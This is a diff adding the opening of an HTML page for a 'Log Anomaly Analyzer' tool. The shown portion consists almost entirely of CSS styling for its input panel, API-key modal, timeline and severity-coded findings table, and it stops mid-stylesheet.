@@ -1,0 +1,3781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Log Anomaly Analyzer</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Source+Code+Pro:wght@400;500;600&display=swap" />
+
+<style>
+  :root {
+    --bg-body: #0d1117;
+    --bg-card: #161b22;
+    --bg-elev: #1c2230;
+    --border: #30363d;
+    --border-soft: #21262d;
+    --accent-red: #f85149;
+    --success-green: #3fb950;
+    --warning-amber: #d29922;
+    --text: #e6edf3;
+    --text-muted: #8b949e;
+    --text-dim: #7d8590;
+    --font-ui: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    --font-mono: 'Source Code Pro', 'Consolas', 'Monaco', monospace;
+    --radius: 10px;
+    --shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg-body);
+    color: var(--text);
+    font-family: var(--font-ui);
+    font-size: 14px;
+    line-height: 1.5;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  /* Subtle grid background */
+  body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(248, 81, 73, 0.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(248, 81, 73, 0.025) 1px, transparent 1px);
+    background-size: 32px 32px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ===== HEADER ===== */
+  .app-header {
+    position: relative;
+    z-index: 1;
+    background: linear-gradient(180deg, #161b22 0%, #12171e 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 18px 28px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.03), var(--shadow);
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .brand-mark {
+    width: 42px;
+    height: 42px;
+    border-radius: 10px;
+    background: linear-gradient(135deg, rgba(248, 81, 73, 0.18), rgba(248, 81, 73, 0.05));
+    border: 1px solid rgba(248, 81, 73, 0.35);
+    display: grid;
+    place-items: center;
+    color: var(--accent-red);
+    font-size: 20px;
+    box-shadow: inset 0 0 12px rgba(248, 81, 73, 0.15);
+  }
+
+  .brand-text h1 {
+    margin: 0;
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+    color: var(--text);
+  }
+
+  .brand-text p {
+    margin: 2px 0 0;
+    font-size: 12px;
+    color: var(--text-muted);
+    font-weight: 400;
+    letter-spacing: 0.3px;
+  }
+
+  .header-meta {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    font-size: 12px;
+    color: var(--text-muted);
+  }
+
+  .status-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 5px 10px;
+    border-radius: 999px;
+    background: rgba(63, 185, 80, 0.1);
+    border: 1px solid rgba(63, 185, 80, 0.3);
+    color: var(--success-green);
+    font-weight: 500;
+    font-size: 11px;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+  }
+
+  .status-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--success-green);
+    box-shadow: 0 0 8px var(--success-green);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+  }
+
+  /* ===== LAYOUT ===== */
+  .app-main {
+    position: relative;
+    z-index: 1;
+    display: grid;
+    grid-template-columns: 35% 65%;
+    gap: 20px;
+    padding: 20px 28px 32px;
+    max-width: 1600px;
+    margin: 0 auto;
+  }
+
+  .panel {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    min-height: calc(100vh - 140px);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  .panel-header {
+    padding: 14px 18px;
+    border-bottom: 1px solid var(--border-soft);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent);
+  }
+
+  .panel-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+  }
+
+  .panel-title i {
+    color: var(--accent-red);
+    font-size: 13px;
+  }
+
+  .panel-body {
+    flex: 1;
+    padding: 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+    color: var(--text);
+    font-size: 13px;
+  }
+
+  .panel-body.placeholder-body {
+    align-items: center;
+    justify-content: center;
+    color: var(--text-dim);
+    font-family: var(--font-mono);
+    letter-spacing: 0.5px;
+  }
+
+  .placeholder {
+    border: 1px dashed var(--border);
+    border-radius: 8px;
+    padding: 40px 24px;
+    width: 100%;
+    text-align: center;
+    background: rgba(255, 255, 255, 0.01);
+  }
+
+  .placeholder i {
+    font-size: 28px;
+    color: var(--border);
+    margin-bottom: 12px;
+    display: block;
+  }
+
+  /* ===== LOG TYPE TABS ===== */
+  .log-type-label {
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 1.4px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: -4px;
+  }
+
+  .log-tabs {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    padding: 6px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+  }
+
+  .log-tab {
+    flex: 1 1 calc(33.333% - 6px);
+    min-width: 88px;
+    padding: 8px 10px;
+    background: transparent;
+    border: 1px solid transparent;
+    border-radius: 6px;
+    color: var(--text-muted);
+    font-family: var(--font-ui);
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    transition: all 0.15s ease;
+    white-space: nowrap;
+  }
+
+  .log-tab:hover {
+    background: rgba(255, 255, 255, 0.04);
+    color: var(--text);
+  }
+
+  .log-tab.active {
+    background: rgba(248, 81, 73, 0.12);
+    border-color: rgba(248, 81, 73, 0.45);
+    color: var(--accent-red);
+    box-shadow: inset 0 0 8px rgba(248, 81, 73, 0.1);
+  }
+
+  .log-tab .tab-emoji {
+    font-size: 13px;
+    line-height: 1;
+  }
+
+  /* ===== TEXTAREA ===== */
+  .input-wrap {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+  }
+
+  .log-textarea {
+    width: 100%;
+    flex: 1;
+    min-height: 300px;
+    resize: vertical;
+    padding: 14px 16px;
+    background: #0a0e14;
+    color: var(--text);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 1.55;
+    letter-spacing: 0.2px;
+    outline: none;
+    transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    overflow: auto;
+    tab-size: 4;
+  }
+
+  .log-textarea::placeholder {
+    color: var(--text-dim);
+    font-style: normal;
+  }
+
+  .log-textarea:focus {
+    border-color: rgba(248, 81, 73, 0.5);
+    box-shadow: 0 0 0 3px rgba(248, 81, 73, 0.12);
+  }
+
+  /* ===== COUNTER ===== */
+  .input-counter {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-family: var(--font-mono);
+    font-size: 11.5px;
+    color: var(--text-muted);
+    letter-spacing: 0.4px;
+  }
+
+  .counter-value {
+    color: var(--text);
+    font-weight: 600;
+  }
+
+  .counter-divider {
+    color: var(--text-dim);
+    margin: 0 6px;
+  }
+
+  /* ===== BUTTONS ===== */
+  .input-actions {
+    display: flex;
+    gap: 10px;
+    align-items: stretch;
+  }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 11px 16px;
+    border-radius: 8px;
+    font-family: var(--font-ui);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    cursor: pointer;
+    border: 1px solid transparent;
+    transition: all 0.15s ease;
+    white-space: nowrap;
+    user-select: none;
+  }
+
+  .btn:focus-visible {
+    outline: 2px solid rgba(248, 81, 73, 0.6);
+    outline-offset: 2px;
+  }
+
+  .btn-secondary {
+    background: var(--bg-elev);
+    border-color: var(--border);
+    color: var(--text);
+  }
+
+  .btn-secondary:hover {
+    background: #232a36;
+    border-color: #3d4654;
+  }
+
+  .btn-primary {
+    background: linear-gradient(180deg, #f85149 0%, #d83a32 100%);
+    color: #fff;
+    flex: 1;
+    padding: 13px 18px;
+    font-size: 14px;
+    box-shadow: 0 4px 14px rgba(248, 81, 73, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.18);
+  }
+
+  .btn-primary:hover {
+    background: linear-gradient(180deg, #ff5d55 0%, #e04039 100%);
+    box-shadow: 0 6px 18px rgba(248, 81, 73, 0.42), inset 0 1px 0 rgba(255, 255, 255, 0.22);
+    transform: translateY(-1px);
+  }
+
+  .btn-primary:active {
+    transform: translateY(0);
+    box-shadow: 0 2px 8px rgba(248, 81, 73, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.12);
+  }
+
+  /* ===== COLLAPSIBLE SETTINGS ===== */
+  .settings {
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+    background: var(--bg-elev);
+    overflow: hidden;
+  }
+
+  .settings-toggle {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    padding: 11px 14px;
+    background: transparent;
+    border: none;
+    color: var(--text);
+    font-family: var(--font-ui);
+    font-size: 12.5px;
+    font-weight: 600;
+    letter-spacing: 0.4px;
+    cursor: pointer;
+    text-align: left;
+  }
+
+  .settings-toggle:hover { background: rgba(255, 255, 255, 0.03); }
+
+  .settings-toggle .chev {
+    transition: transform 0.2s ease;
+    color: var(--text-muted);
+    font-size: 11px;
+  }
+
+  .settings.open .settings-toggle .chev { transform: rotate(180deg); }
+
+  .settings-body {
+    display: none;
+    padding: 6px 14px 14px;
+    border-top: 1px solid var(--border-soft);
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .settings.open .settings-body { display: flex; }
+
+  .field {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .field-label {
+    font-size: 10.5px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+  }
+
+  .field-hint {
+    font-size: 10.5px;
+    color: var(--text-dim);
+    margin-left: 6px;
+    text-transform: none;
+    letter-spacing: 0.2px;
+    font-weight: 400;
+  }
+
+  .text-input,
+  .text-area-sm {
+    width: 100%;
+    background: #0a0e14;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    padding: 9px 11px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    outline: none;
+    transition: border-color 0.15s ease, box-shadow 0.15s ease;
+  }
+
+  .text-area-sm {
+    resize: vertical;
+    min-height: 56px;
+    max-height: 140px;
+    line-height: 1.5;
+  }
+
+  .text-input:focus,
+  .text-area-sm:focus {
+    border-color: rgba(248, 81, 73, 0.5);
+    box-shadow: 0 0 0 3px rgba(248, 81, 73, 0.1);
+  }
+
+  .radio-group {
+    display: flex;
+    gap: 6px;
+    background: #0a0e14;
+    padding: 4px;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+  }
+
+  .radio-pill {
+    flex: 1;
+    position: relative;
+  }
+
+  .radio-pill input {
+    position: absolute;
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  .radio-pill label {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    padding: 7px 6px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text-muted);
+    cursor: pointer;
+    border: 1px solid transparent;
+    transition: all 0.15s ease;
+  }
+
+  .radio-pill label:hover { color: var(--text); background: rgba(255, 255, 255, 0.03); }
+
+  .radio-pill input:checked + label {
+    background: rgba(248, 81, 73, 0.12);
+    border-color: rgba(248, 81, 73, 0.4);
+    color: var(--text);
+  }
+
+  .radio-pill input:focus-visible + label {
+    outline: 2px solid rgba(248, 81, 73, 0.5);
+    outline-offset: 2px;
+  }
+
+  /* ===== HEADER API KEY BUTTON ===== */
+  .header-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 11px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: var(--font-ui);
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.15s ease;
+  }
+
+  .header-btn:hover {
+    background: #232a36;
+    border-color: #3d4654;
+  }
+
+  .header-btn .key-mask {
+    color: var(--text-muted);
+    font-family: var(--font-mono);
+    font-size: 11px;
+  }
+
+  .header-btn.unset {
+    border-color: rgba(210, 153, 34, 0.5);
+    color: var(--warning-amber);
+  }
+
+  /* ===== MODAL ===== */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(2, 6, 12, 0.72);
+    backdrop-filter: blur(4px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    padding: 20px;
+    animation: fadeIn 0.15s ease;
+  }
+
+  .modal-overlay.open { display: flex; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .modal {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    width: 100%;
+    max-width: 480px;
+    box-shadow: 0 24px 64px rgba(0, 0, 0, 0.6);
+    animation: slideIn 0.2s ease;
+    overflow: hidden;
+  }
+
+  @keyframes slideIn {
+    from { transform: translateY(8px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .modal-header {
+    padding: 18px 22px;
+    border-bottom: 1px solid var(--border-soft);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .modal-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 15px;
+    font-weight: 600;
+  }
+
+  .modal-title i { color: var(--accent-red); }
+
+  .modal-close {
+    background: transparent;
+    border: none;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 16px;
+    padding: 4px 8px;
+    border-radius: 4px;
+  }
+
+  .modal-close:hover { color: var(--text); background: rgba(255, 255, 255, 0.05); }
+
+  .modal-body {
+    padding: 20px 22px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .modal-body p {
+    margin: 0;
+    color: var(--text-muted);
+    font-size: 13px;
+    line-height: 1.55;
+  }
+
+  .modal-body a {
+    color: var(--accent-red);
+    text-decoration: none;
+  }
+  .modal-body a:hover { text-decoration: underline; }
+
+  .modal-footer {
+    padding: 14px 22px 18px;
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+    border-top: 1px solid var(--border-soft);
+    background: rgba(0, 0, 0, 0.15);
+  }
+
+  .key-current {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    padding: 8px 12px;
+    background: #0a0e14;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text-muted);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+  }
+
+  .key-current .pill {
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--success-green);
+    background: rgba(63, 185, 80, 0.1);
+    border: 1px solid rgba(63, 185, 80, 0.3);
+    padding: 2px 7px;
+    border-radius: 999px;
+  }
+
+  /* ===== RESPONSIVE ===== */
+  @media (max-width: 768px) {
+    .app-header {
+      padding: 14px 16px;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .header-meta {
+      width: 100%;
+      justify-content: flex-start;
+    }
+
+    .app-main {
+      grid-template-columns: 1fr;
+      padding: 14px 16px 24px;
+      gap: 14px;
+    }
+
+    .panel {
+      min-height: 360px;
+    }
+
+    .brand-text h1 { font-size: 16px; }
+  }
+
+  /* ===== SPINNER OVERLAY ===== */
+  .spinner-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(13, 17, 23, 0.85);
+    backdrop-filter: blur(3px);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 18px;
+    z-index: 10;
+    padding: 24px;
+    text-align: center;
+  }
+
+  .spinner {
+    width: 42px;
+    height: 42px;
+    border: 3px solid rgba(248, 81, 73, 0.18);
+    border-top-color: var(--accent-red);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .spinner-msg {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: var(--text);
+    letter-spacing: 0.3px;
+    min-height: 1.4em;
+    transition: opacity 0.25s ease;
+  }
+
+  .spinner-sub {
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .btn:disabled,
+  .btn.is-loading {
+    opacity: 0.55;
+    cursor: not-allowed;
+    pointer-events: none;
+    transform: none !important;
+  }
+
+  #output-panel { position: relative; overflow: visible; }
+
+  /* ===== OUTPUT TOOLBAR ===== */
+  .output-toolbar {
+    position: sticky;
+    top: 0;
+    z-index: 25;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    padding: 10px 14px;
+    background: rgba(22, 27, 34, 0.92);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--border-soft);
+  }
+
+  .tb-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 7px 11px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border);
+    border-radius: 7px;
+    color: var(--text);
+    font-family: var(--font-ui);
+    font-size: 12px;
+    font-weight: 500;
+    letter-spacing: 0.2px;
+    cursor: pointer;
+    transition: background 0.15s ease, border-color 0.15s ease, transform 0.1s ease;
+    white-space: nowrap;
+  }
+
+  .tb-btn:hover:not(:disabled) {
+    background: #232a36;
+    border-color: #3d4654;
+  }
+
+  .tb-btn:active:not(:disabled) { transform: translateY(1px); }
+
+  .tb-btn:disabled {
+    opacity: 0.45;
+    cursor: not-allowed;
+  }
+
+  .tb-btn.tb-btn-danger {
+    border-color: rgba(248, 81, 73, 0.35);
+    color: #ff8680;
+  }
+
+  .tb-btn.tb-btn-danger:hover:not(:disabled) {
+    background: rgba(248, 81, 73, 0.1);
+    border-color: rgba(248, 81, 73, 0.55);
+  }
+
+  /* ===== TOAST ===== */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    z-index: 200;
+    padding: 11px 18px;
+    background: #12171e;
+    border: 1px solid var(--success-green);
+    border-radius: 8px;
+    color: var(--text);
+    font-size: 13px;
+    font-weight: 500;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    opacity: 0;
+    transform: translateY(8px);
+    pointer-events: none;
+    transition: opacity 0.18s ease, transform 0.18s ease;
+  }
+
+  .toast.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  .toast.toast-error {
+    border-color: var(--accent-red);
+  }
+
+  /* ===== SHARE MODAL ===== */
+  .share-textarea {
+    width: 100%;
+    min-height: 220px;
+    padding: 12px 14px;
+    background: #0a0e14;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 12px;
+    line-height: 1.55;
+    resize: vertical;
+    outline: none;
+  }
+
+  .share-textarea:focus {
+    border-color: rgba(248, 81, 73, 0.5);
+    box-shadow: 0 0 0 3px rgba(248, 81, 73, 0.12);
+  }
+
+  .modal-wide .modal { max-width: 560px; }
+
+
+  .result-placeholder {
+    color: var(--success-green);
+    font-family: var(--font-mono);
+    font-size: 14px;
+    letter-spacing: 0.3px;
+    padding: 24px;
+    border: 1px dashed rgba(63, 185, 80, 0.4);
+    background: rgba(63, 185, 80, 0.05);
+    border-radius: 8px;
+    text-align: center;
+    width: 100%;
+  }
+
+  .error-box {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid rgba(248, 81, 73, 0.4);
+    background: rgba(248, 81, 73, 0.08);
+    border-radius: 8px;
+    color: var(--text);
+    font-size: 13px;
+    line-height: 1.55;
+    text-align: left;
+  }
+
+  .error-box strong {
+    color: var(--accent-red);
+    display: block;
+    margin-bottom: 6px;
+    font-size: 13px;
+  }
+
+  .raw-response {
+    width: 100%;
+    max-height: 320px;
+    overflow: auto;
+    padding: 12px 14px;
+    background: #0a0e14;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--text-muted);
+    white-space: pre-wrap;
+    word-break: break-word;
+    margin-top: 10px;
+  }
+
+  /* ===== TIMELINE VISUALIZATION ===== */
+  .timeline-section {
+    width: 100%;
+    margin-top: 16px;
+    padding: 18px 22px 22px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    box-shadow: var(--shadow);
+  }
+
+  .timeline-title {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 18px;
+  }
+
+  .timeline-title i {
+    color: var(--accent-red);
+    font-size: 12px;
+  }
+
+  .timeline-track {
+    position: relative;
+    height: 90px;
+    margin: 0 18px;
+  }
+
+  .timeline-line {
+    position: absolute;
+    top: 50%;
+    left: 0;
+    right: 0;
+    height: 2px;
+    background: linear-gradient(90deg,
+      rgba(248, 81, 73, 0.25) 0%,
+      var(--border) 20%,
+      var(--border) 80%,
+      rgba(248, 81, 73, 0.25) 100%);
+    transform: translateY(-50%);
+    border-radius: 2px;
+  }
+
+  .timeline-endcap {
+    position: absolute;
+    top: 50%;
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--border);
+    transform: translate(-50%, -50%);
+  }
+  .timeline-endcap.left  { left: 0; }
+  .timeline-endcap.right { left: 100%; }
+
+  .tl-marker {
+    position: absolute;
+    width: 13px;
+    height: 13px;
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    border: 2px solid var(--bg-card);
+    cursor: pointer;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    z-index: 2;
+  }
+
+  .tl-marker:hover {
+    transform: translate(-50%, -50%) scale(1.35);
+    z-index: 20;
+  }
+
+  .tl-marker.tl-sev-critical { background: #f85149; color: #f85149; box-shadow: 0 0 10px rgba(248, 81, 73, 0.55); }
+  .tl-marker.tl-sev-high     { background: #db6d28; color: #db6d28; box-shadow: 0 0 8px rgba(219, 109, 40, 0.45); }
+  .tl-marker.tl-sev-medium   { background: #d29922; color: #d29922; box-shadow: 0 0 8px rgba(210, 153, 34, 0.4); }
+  .tl-marker.tl-sev-low      { background: #58a6ff; color: #58a6ff; box-shadow: 0 0 8px rgba(88, 166, 255, 0.4); }
+  .tl-marker.tl-sev-info     { background: #8b949e; color: #8b949e; }
+
+  .tl-tooltip {
+    position: absolute;
+    bottom: calc(100% + 14px);
+    left: 50%;
+    transform: translateX(-50%);
+    min-width: 200px;
+    max-width: 300px;
+    padding: 10px 12px;
+    background: #0a0e14;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-family: var(--font-ui);
+    font-size: 12px;
+    line-height: 1.45;
+    text-align: left;
+    box-shadow: 0 12px 28px rgba(0, 0, 0, 0.55);
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+    transition: opacity 0.15s ease, transform 0.15s ease;
+    z-index: 30;
+    white-space: normal;
+  }
+
+  .tl-tooltip::after {
+    content: "";
+    position: absolute;
+    top: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    border: 6px solid transparent;
+    border-top-color: #0a0e14;
+  }
+
+  .tl-marker:hover .tl-tooltip,
+  .tl-marker:focus-visible .tl-tooltip {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .tl-marker.tl-at-left  .tl-tooltip { left: 0;   transform: none; }
+  .tl-marker.tl-at-left  .tl-tooltip::after { left: 10px; transform: none; }
+  .tl-marker.tl-at-right .tl-tooltip { left: auto; right: 0; transform: none; }
+  .tl-marker.tl-at-right .tl-tooltip::after { left: auto; right: 10px; transform: none; }
+
+  .tl-tooltip .tl-time {
+    font-family: var(--font-mono);
+    font-size: 10.5px;
+    color: var(--text-muted);
+    margin-bottom: 5px;
+    letter-spacing: 0.3px;
+  }
+
+  .tl-tooltip .tl-type {
+    display: inline-block;
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    text-transform: uppercase;
+    padding: 2px 7px;
+    border-radius: 999px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid var(--border-soft);
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+
+  .tl-tooltip .tl-expl {
+    color: var(--text-muted);
+    font-size: 11.5px;
+  }
+
+  .timeline-axis {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 6px;
+    padding: 0 0 2px;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.3px;
+  }
+
+  .timeline-axis .axis-label {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .timeline-axis .axis-cap {
+    font-size: 9.5px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    font-family: var(--font-ui);
+  }
+
+  .timeline-axis .axis-right { text-align: right; align-items: flex-end; }
+
+  @media (max-width: 768px) {
+    .timeline-track { margin: 0 8px; }
+    .tl-tooltip { min-width: 170px; max-width: 220px; }
+  }
+
+  /* ===== ANOMALY FINDINGS TABLE ===== */
+  .findings-section {
+    width: 100%;
+    margin-top: 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .findings-title {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+  }
+
+  .findings-title i {
+    color: var(--accent-red);
+    font-size: 12px;
+  }
+
+  .findings-title .count-chip {
+    margin-left: 4px;
+    padding: 2px 8px;
+    border-radius: 999px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-size: 10.5px;
+    letter-spacing: 0.5px;
+  }
+
+  .findings-table-wrap {
+    width: 100%;
+    max-height: 560px;
+    overflow: auto;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    background: var(--bg-card);
+  }
+
+  .findings-table {
+    width: 100%;
+    min-width: 1100px;
+    border-collapse: separate;
+    border-spacing: 0;
+    font-size: 12.5px;
+    color: var(--text);
+  }
+
+  .findings-table thead th {
+    position: sticky;
+    top: 0;
+    z-index: 2;
+    background: #12171e;
+    color: var(--text-muted);
+    font-size: 10.5px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    text-align: left;
+    padding: 11px 12px;
+    border-bottom: 1px solid var(--border);
+    white-space: nowrap;
+  }
+
+  .findings-table tbody td {
+    padding: 12px;
+    border-bottom: 1px solid var(--border-soft);
+    vertical-align: top;
+    line-height: 1.5;
+  }
+
+  .findings-table tbody tr:last-child td {
+    border-bottom: none;
+  }
+
+  .findings-table tbody tr {
+    transition: background-color 0.15s ease;
+  }
+
+  .findings-table tbody tr:hover {
+    background: rgba(255, 255, 255, 0.02);
+  }
+
+  .col-idx    { width: 44px;  color: var(--text-dim); font-family: var(--font-mono); }
+  .col-sev    { width: 110px; }
+  .col-type   { width: 150px; }
+  .col-what   { min-width: 220px; }
+  .col-ev     { min-width: 260px; }
+  .col-time   { width: 130px; color: var(--text-muted); font-family: var(--font-mono); font-size: 12px; white-space: nowrap; }
+  .col-expl   { min-width: 240px; }
+  .col-action { min-width: 220px; }
+
+  .col-what, .col-expl, .col-action {
+    overflow-wrap: anywhere;
+    word-break: break-word;
+  }
+
+  .col-ev {
+    font-family: var(--font-mono);
+    font-size: 11.5px;
+    color: var(--text-muted);
+    background: rgba(10, 14, 20, 0.5);
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+    word-break: break-word;
+    line-height: 1.5;
+  }
+
+  .col-ev .ev-line {
+    display: block;
+  }
+
+  .col-ev .ev-line + .ev-line {
+    margin-top: 4px;
+    padding-top: 4px;
+    border-top: 1px dashed var(--border-soft);
+  }
+
+  .col-type {
+    font-family: var(--font-mono);
+    font-size: 11.5px;
+    color: var(--text);
+    text-transform: lowercase;
+  }
+
+  /* Severity pill badges */
+  .sev-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 3px 9px;
+    border-radius: 999px;
+    font-size: 10.5px;
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    text-transform: uppercase;
+    border: 1px solid transparent;
+    font-family: var(--font-ui);
+    white-space: nowrap;
+  }
+
+  .sev-badge .sev-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    display: inline-block;
+  }
+
+  .sev-critical {
+    background: rgba(248, 81, 73, 0.14);
+    border-color: rgba(248, 81, 73, 0.45);
+    color: #ff7b74;
+  }
+  .sev-critical .sev-dot { background: #f85149; box-shadow: 0 0 6px #f85149; }
+
+  .sev-high {
+    background: rgba(219, 109, 40, 0.14);
+    border-color: rgba(219, 109, 40, 0.45);
+    color: #f0854a;
+  }
+  .sev-high .sev-dot { background: #db6d28; }
+
+  .sev-medium {
